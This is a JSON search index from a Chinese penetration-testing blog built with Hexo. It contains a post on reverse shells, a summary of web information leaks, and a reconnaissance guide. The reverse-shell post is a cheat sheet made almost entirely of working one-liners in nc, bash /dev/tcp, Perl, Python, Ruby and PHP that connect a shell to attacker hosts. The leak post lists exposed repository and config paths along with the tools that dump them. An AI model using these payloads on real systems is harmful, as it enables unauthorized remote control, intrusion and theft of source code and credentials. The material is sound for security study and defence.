{"meta":{"title":"浅笑996的博客","subtitle":"","description":"","author":"qianxiao996","url":"http://blog.qianxiao996.cn","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2020-07-04T08:47:02.333Z","updated":"2020-07-04T08:47:02.333Z","comments":false,"path":"/404.html","permalink":"http://blog.qianxiao996.cn/404.html","excerpt":"","text":""},{"title":"分类","date":"2020-07-04T09:17:27.642Z","updated":"2020-07-04T08:47:02.399Z","comments":false,"path":"categories/index.html","permalink":"http://blog.qianxiao996.cn/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2020-07-04T08:47:02.384Z","updated":"2020-07-04T08:47:02.384Z","comments":false,"path":"books/index.html","permalink":"http://blog.qianxiao996.cn/books/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2020-07-04T08:47:02.414Z","updated":"2020-07-04T08:47:02.414Z","comments":true,"path":"links/index.html","permalink":"http://blog.qianxiao996.cn/links/index.html","excerpt":"","text":""},{"title":"关于","date":"2020-07-04T08:47:02.370Z","updated":"2020-07-04T08:47:02.370Z","comments":false,"path":"about/index.html","permalink":"http://blog.qianxiao996.cn/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"标签","date":"2020-07-04T08:47:02.445Z","updated":"2020-07-04T08:47:02.445Z","comments":false,"path":"tags/index.html","permalink":"http://blog.qianxiao996.cn/tags/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2020-07-04T08:47:02.430Z","updated":"2020-07-04T08:47:02.430Z","comments":false,"path":"repository/index.html","permalink":"http://blog.qianxiao996.cn/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"Hello World","slug":"hello-world","date":"2020-07-04T07:31:12.114Z","updated":"2020-07-04T07:31:12.114Z","comments":true,"path":"2020/07/04/hello-world/","link":"","permalink":"http://blog.qianxiao996.cn/2020/07/04/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"各种环境下反弹shell","slug":"各种环境下反弹shell","date":"2019-06-21T04:01:35.000Z","updated":"2020-07-04T09:54:31.612Z","comments":true,"path":"2019/06/21/各种环境下反弹shell/","link":"","permalink":"http://blog.qianxiao996.cn/2019/06/21/%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/","excerpt":"","text":"0x00 NC命令详解在介绍如何反弹shell之前，先了解相关知识要点。 nc全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流 可运行在TCP或者UDP模式，添加参数 —u 则调整为udP，默认为tcp，详细参数如下 -g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。 -G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。 -h 在线帮助。 -i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。 -l 使用监听模式，管控传入的资料。 -n 直接使用IP地址，而不通过域名服务器。 -o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。 -p&lt;通信端口&gt; 设置本地主机使用的通信端口。 -r 乱数指定本地与远端主机的通信端口。 -s&lt;来源地址&gt; 设置本地主机送出数据包的IP地址。 -u 使用UDP传输协议。 -v 显示指令执行过程。 -w&lt;超时秒数&gt; 设置等待连线的时间。 -z 使用0输入/输出模式，只在扫描通信端口时使用。 1$ nc -v 172.31.100.7 21 netcat 命令会连接开放端口21并且打印运行在这个端口上服务的banner信息。 1、使用nc聊天1$nc -l 1567 netcat 命令在1567端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。 1$nc 172.31.100.7 1567 不管你在机器B上键入什么都会出现在机器A上。 实测好像并不可以… 2、nc进行文件传输Server: 1$nc -l 1567 &lt; file.txt &#96;&#96;&#96; Client: &#96;&#96;&#96; $nc -n 172.31.100.7 1567 &gt; file.txt 好像也不行…不管这些还是直接来反弹shell吧 0x01 NC1、正向反弹shell服务器端 1nc -lvvp 7777 -e &#x2F;bin&#x2F;bash 本地 1nc 192.168.242.129 7777 即可获得服务器端的shell 2、反向反弹shell服务端 1nc -e &#x2F;bin&#x2F;bash 192.168.242.1 7777 本地 1nc -lvvp 7777 不使用-e参数反弹使用管道服务端 12mknod &#x2F;tmp&#x2F;backpipe p &#x2F;bin&#x2F;sh 0&#x2F;tmp&#x2F;backpipe 攻击端 1nc -lnvp 7777 mknod需要root用户，但是也可以通过mkfifo /tmp/backpipe也可以创建一个管道。 0x02 Bash服务端： 123bash -c &#39;sh -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;210.28.30.887&#x2F;53 0&gt;&amp;1&#39;或者bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.242.1&#x2F;7777 0&gt;&amp;1 攻击端 1nc -lvvp 7777 0x03 Perl第一种方式（linux）12perl -e &#39;use Socket;$i&#x3D;&quot;192.168.242.1&quot;;$p&#x3D;7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39; 本地：nc -nvlp 7777 第二种方式（linux）1perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;192.168.242.1:7777&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; 第三种方式（windwos）1perl -MIO -e &#39;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; 0x04 Python12python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;120.27.32.227&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; 本地：nc -nvlp 7777 0x05 ruby第一种方式1ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.10.10.166&quot;,4444).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f) 一次性连接，连上就断，换上 msd 监听也是这样 第二种（linux）1ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.10.10.166&quot;,4444).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f) 一次性连接，连上就断，换上 msf 监听也是这样 第三种方式（windwos）1ruby -rsocket -e &#39;c&#x3D;TCPSocket.new(&quot;10.10.10.166&quot;,&quot;4444&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39; 0x06 PHP12php -r &#39;$sock&#x3D;fsockopen(&quot;10.10.10.166&quot;,4444);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;本地 nc -nvlp 4444 0x07 exec第一种方式123exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.10.166&#x2F;4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done本地：nc -nvlp 4444 第二种方式120&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.10.166&#x2F;4444; sh &lt;&amp;196&gt;&amp;196 2&gt;&amp;196 本地 nc -nvlp 4444 0x08 原生的 shell 切换交互式 bash123456root@kali:~# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.10.166] from (UNKNOWN) [10.10.10.50] 39840 $ $ $ $ python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; kevin@ubuntu:~$ 0x09 最后个人觉得这几种应该就够用了，至于其他环境，再看具体情况吧，有一些环境服务器不一定有的 参考链接： https://www.cnblogs.com/deen-/p/7237327.html https://blog.csdn.net/Kevinhanser/article/details/88920278","categories":[{"name":"渗透技巧","slug":"渗透技巧","permalink":"http://blog.qianxiao996.cn/categories/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"}],"tags":[{"name":"反弹shell","slug":"反弹shell","permalink":"http://blog.qianxiao996.cn/tags/%E5%8F%8D%E5%BC%B9shell/"}]},{"title":"信息泄露总结","slug":"信息泄露总结","date":"2019-06-15T10:30:15.000Z","updated":"2020-07-04T09:49:41.993Z","comments":true,"path":"2019/06/15/信息泄露总结/","link":"","permalink":"http://blog.qianxiao996.cn/2019/06/15/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/","excerpt":"","text":"在渗透测试过程中，由于网站配置不当，或者代码逻辑错误，往往会泄露一些敏感信息，本文对此做一个总结，欢迎各位补充。 01、Apache样例文件泄露apache 的一些样例文件没有删除，可能存在可能存在cookie、session伪造，进行后台登录操作。常见的路径有： 1234http:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;CookieExamplehttp:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;RequestHeaderExamplehttp:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;jsp&#x2F;snp&#x2F;snoop.jsphttp:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;async&#x2F;async1 02、IIS短文件名工具：https://github.com/lijiejie/IIS_shortname_Scanner 利用： 03、字段加[] 造成信息泄露网站所有参数均存在，把参数变为数组即可报错出网站绝对路径。 比如： 04、修改请求方法将get方法改为put 程序就报错，泄漏网站绝对路径。比如： 当然，也可修改位其他方法，多fuzz。 05、war文件信息泄露war文件信息泄露是指部署在war文件由于配置不当，导致其整个报文件以及其他重要的配置文件信息泄露，例如可以直接浏览目录，获取其下面的配置文件：WEB-INF/jdbc.properties,jdbc.properties为数据库链接配置文件。包含数据库链接的账户和密码等重要信息。比如： java 一般重要的配置文件位于 WEB-INF 目录下，其常见的重要的配置文件有： 1234567config&#x2F;config.propertiesconfigure&#x2F;configure.propertiesapplicationContext.xmlsysconfig.propertiesweb.xmlconfig.xmljdbc.properties 06、swagger常见路径： 12345&#x2F;swagger-ui.html&#x2F;swagger&#x2F;swagger-ui.html&#x2F;api&#x2F;swagger-ui.html&#x2F;v1.x&#x2F;swagger-ui.html&#x2F;swagger&#x2F;index.html https://datax.yahoo.com/%20/。然后我看到了以下页面。 07、Tomcattomcat 后缀改成大写，会显示源码，只要把jsp文件后缀名改为大写就可以 比如： 08、阿里云oosaccesskey泄露上传文件处，在返回包中直接显示了阿里oss静态服务器的OSSAccessKeyId的值，导致信息泄漏 。 09、j2ee应用异常信息Java异常处理机制（Exception）简要说明：Java中它是由Trowable类的两个子类的两大部分组成，Error类和Exception类。Error是不推荐捕获的（请查看Java异常处理机制中Error与Exception的区别），而Exception类除了子类RuntimeException是不能被捕获，其他子类的异常必须捕获，简单来讲，就产生异常信息了。 但Exception产生异常信息的过程有个特点，当发生异常时，异常抛给调用该函数的上一级函数，直到出现包含异常处理（catch）的层为止，这个给开发者在程序调试中带来很大的方便，能够快速定位问题所在等 形成XSS的场景：与上面场景不同的地方有两个： 1、如果开发者自己处理了异常信息但还是向用户抛出（在实际开发中这情况还不少，还做个用户体验页面，让用户把这些异常信息反馈给管理员（当然，开发者本意是好的！）。） 2、带有用户输入而又未做XSS防御处理的数据（攻击者的恶意代码）。 当然，如果最后默认是交给容器处理输出，是不会有这问题，如图： 10、源代码泄露(1).Mercurial .hg 源码泄露hg在初始化代码库的时候，会在当前目录下面产生一个.hg的隐藏文件 eg: 1http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F; 工具： 1https:&#x2F;&#x2F;github.com&#x2F;kost&#x2F;dvcs-ripper 使用： 1rip-hg.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F; (2).git 源码泄露在运行 git init 的时候，在当前目录下会产生一个.git 文件。 eg: 1http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F; 工具：Githack 1githack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F; (3).DS_Store 文件泄露在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。 eg: 1http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store&#x2F; 工具： 1https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;ds_store_exp 使用： 1ds_store_exp.py http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store&#x2F; (4).svn 源代码泄露使用svn版本控制系统时，由于错误操作将.svn文件暴露在外网环境中，即可利用该文件还原出服务器源码、SVN服务器账号密码等信息。eg: 1http:&#x2F;&#x2F;www.example.com&#x2F;.svn&#x2F;entries 工具：seay-Svn (5).cvs文件泄露12http:&#x2F;&#x2F;www.example.com&#x2F;CSV&#x2F;Root 返回根信息http:&#x2F;&#x2F;www.example.com&#x2F;CSV&#x2F;Entries 返回所有文件结构 (6).bazaarbazaar信息泄露bazaarbazaar是一个版本控制系统，可以追踪项目历史 eg: 1http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F; 工具： 1https:&#x2F;&#x2F;github.com&#x2F;kost&#x2F;dvcs-ripper 使用： 1rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F; (7).WEB-INF/web.xml 泄露WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。 12345&#x2F;WEB-INF&#x2F;web.xml&#x2F;WEB-INF&#x2F;classes&#x2F;&#x2F;WEB-INF&#x2F;lib&#x2F;&#x2F;WEB-INF&#x2F;src&#x2F;&#x2F;WEB-INF&#x2F;database.properties 11、总结以上是笔者学习中遇到的，欢迎各位大佬继续补充。","categories":[{"name":"信息收集","slug":"信息收集","permalink":"http://blog.qianxiao996.cn/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://blog.qianxiao996.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"渗透测试之信息收集","slug":"渗透测试之信息收集","date":"2019-06-11T03:30:15.000Z","updated":"2020-07-04T09:37:26.907Z","comments":true,"path":"2019/06/11/渗透测试之信息收集/","link":"","permalink":"http://blog.qianxiao996.cn/2019/06/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"一、DNS1、A记录 ping nslookup dig 域名 dig -t a baidu.com 2、NS记录（DNS服务器） dig -t NS 域名 3、MX记录（邮件服务器） dig -t MX baidu.com 4、CNAME记录（别名） dig -t CNAME baidu.com 5、whois查询（域名信息查询）whois.chinaz.comwhois.iana.orgwww.arin.netwho.iscentralops.netwww.17ce.com 二、子域名1、爆破 dnsmap baidu.com -w 字典dnsmap默认字典 /usr/share/dnsmap/wordlist_TLAs.txt fuzzDomain 工具 Layer子域名挖掘机 2、搜索引擎 google hacker 语法site:baidu.com 3、kali下： theharvesterproxychains theharvester -d baidu.com -b allproxychains 加代理 AQUATONE工具发现 proxychains aquatone-discover -d 域名 -t 10（线程）扫描 proxychains aquatone-scan-d 域名 -t 10（线程）收集 proxychains aquatone-gather -d 域名 -t 10（线程） 4、域传送1fierce -dns baidu.com （域名有DNS服务器才能用） 5、在线网站www.virustotal.comdnsdumpster.comphpinfo.me 三、C段1、Namp扫描Nmap-扫描C段主机存活 1234Nmap -sn -PE -n 192.168.1.1&#x2F;24 -oX out.xml -sn不扫描端口 -PE ICMP扫描 -n不进行dns解析 Nmap-定向端口扫描 123Nmap -sS -Pn -p 3389 ip 扫描方式：半开放扫描 -Pn 不进行主机存活探测 Nmap-全端口扫描 12Nmap -sS -Pn -p 1-65535 -n ip 扫描方式：半开放扫描 Nmap-服务扫描 123Nmap -sS -sV -p 1-65535 -n ip 扫描方式：半开放扫描 显示出端口开发的服务 2、MasscanMasscan-安装 12345sudo apt-get install git gcc make libpcap-dev（安装必备环境，kali已经默认安装完成）git clonehttps:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscancd masscanmake（编译） Masscan-使用 12345678910Masscan -p 80 192.168.1.1&#x2F;24 --rate 1000 -oL output.txt -p设置端口 --rate发包速率 -oL输出位置为了绕过扫描特定ip，可以添加-excludefile Masscan-p 80 ip --excludefile special.txt 自定多种格式输出 -oX输出xml -oJ输出json格式 -oL输出简单列表 Masscan-注意问题 12扫描选项中必须添加端口-p、--ports 1-65535目标主机是IP地址，不是域名 Masscan-总结 123Masscan&#x3D;&#x3D;namp-sS-Pn-n-randomize-hosts-send-eth速率：可以执行最高300、000个数据包每秒注册账号能找到服务器地址 四、web目录扫描1、robots.txt文件https://baidu.com/robots.txt 2、搜索引擎site: baidu.com 3、爆破 dirb (kali下) ddirb https://baidu.com 爆破一DIRB 参数： 设置User-Agent -b不扫描./或者./ -c设置Cookie -E设置证书文件 -o outfile_file保存扫描文件 dirbuster（kali下） （不推荐，已经停止更新） 4、御剑后台扫描（自行下载）五、 指纹1、指纹识别12nmap -sS -Pn -O ipnmap -sS -sV ip 2、中间件指纹识别123方法一： 通过http返回消息中提取server字段方法二： nmap -sS -Pn -sV ip 方法三： 构造错误界面返回信息查看中间件 3、web程序指纹识别 开发语言 1234URL 后缀名识别 .asp .php .jsp抓包，查看与后台交互点http返回消息头 x-Powered-Bycookie可以识别， PHPSESSION --&gt;PHP JSPSESSION --&gt; JSP ASPSESSIONIDAASTCACQ --&gt;ASP 开发框架 1234567php的thinkphp框架识别方法特定ico图标Action后缀 90%几率struts2或者webworkdo后缀 50%几率spring mvcurl路径&#x2F;action&#x2F;xxx70%几率struts2form后缀 60%几率spring mvcVm后缀 90%几率VelocityViewServletjsf后缀 99%几率Java Server Faces 第三方组件 1234一般包括流量统计、文件编辑器、模板引擎识别方法：一般目录扫描FCKeditor CKEditor CMS程序 1234特定文件夹dede&#x2F;、admin&#x2F;admin_Login.aspxPowered by***网站favicon图标 数据库 123常规判断，asp-&gt;sql server，php-&gt;mysql，jsp-oracle网站错误信息端口服务，1443-&gt;sql server，3306-&gt;mysql，oracal-&gt;1521 在线探测 12wappalyzer插件云悉： http:&#x2F;&#x2F;www.yunsee.cn 4、防火墙指纹识别1234nmap -p 80 域名 --script http-waf-fingerprintsqlmap -u 360.cn --identify-wafwafw00f工具 https:&#x2F;&#x2F;github.com&#x2F;EnableSecurity&#x2F;wafw00fpython setup.py install 或者 pip install wafw00f 六、GoogleHacking1、语法1234567+ 强制搜索其后的一个单词- 把某个字忽略~ 同意词. 单一的通配符* 通配符，可代表多个字母&quot; &quot; 精确查询&quot;|&quot;或&quot;OR&quot; 只要符合多个关键字中的任意一个的结果予以显示 2、基本用法12345678910intext:key 搜索网页带有关键字的页面allintext:key 功能与intext，但是可以接多个关键字intitle:key 搜索网页标题中是否有所输入的文字allintitle:key 功能与intext，可以接多个关键字，但不能与别的关键字连用cache:url 查看指定URL快照filetype： 搜索指定类型文件info: 搜索输入URL的摘要信息和其他相关信息，不能与其他关键词混用inurl: 搜索输入字符是否存在于URL中，可以与site结合找后台site： 搜索特定网站或者子域名related:URL 搜索与该URL相关的页面 3、高级用法123456site： 特定网站搜索，可以寻找子域名、域名、端口site: URL filetype:doc 搜索与该域名相关的doc文件site: URL filetype:doc 搜索与该域名相关的doc文件site: URL intitle： 登录搜索与该域名相关联关键词的网页site: URL inurl:&#x2F;login 搜索与该域名相关URL的网页site：36.110.213.* C段快速探测 Google hacking语法收集网站 https://www.exploit-db.com/google-hacking-database/us 七、网络空间搜索引擎1shodan：www.shodan.io 1、基本语法1234567891011hostname:&quot;360.cn&quot; 主机名port：23 搜索端口net：192.168.1.0&#x2F;24 CIDR格式的IP地址city:&quot;San Diego&quot; 城市product:&quot;Apache httpd” version:&quot;2.6.1” 软件版本os:“Windows7&quot; 操作系统country:&quot;CN” 国家简写org:&quot;google” 组织isp:&quot;China Telecom&quot; ISP服务商geo:&quot;38.4681，106.2731” 2、基本使用1234搜索开放80端口的主机 port：80搜索开放80端口的主机，并且服务器是nginx port：80 product:&quot;nginx”C段探测 net:ip&#x2F;24搜索favicon:http.favicon.hash:-395680774 这里搜索的是标题栏的图标 3、其他钟馗之眼 http://www.zoomeye.orgfafo http://www.zoomeye.org","categories":[{"name":"信息收集","slug":"信息收集","permalink":"http://blog.qianxiao996.cn/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://blog.qianxiao996.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]}],"categories":[{"name":"渗透技巧","slug":"渗透技巧","permalink":"http://blog.qianxiao996.cn/categories/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"},{"name":"信息收集","slug":"信息收集","permalink":"http://blog.qianxiao996.cn/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"反弹shell","slug":"反弹shell","permalink":"http://blog.qianxiao996.cn/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"信息收集","slug":"信息收集","permalink":"http://blog.qianxiao996.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]}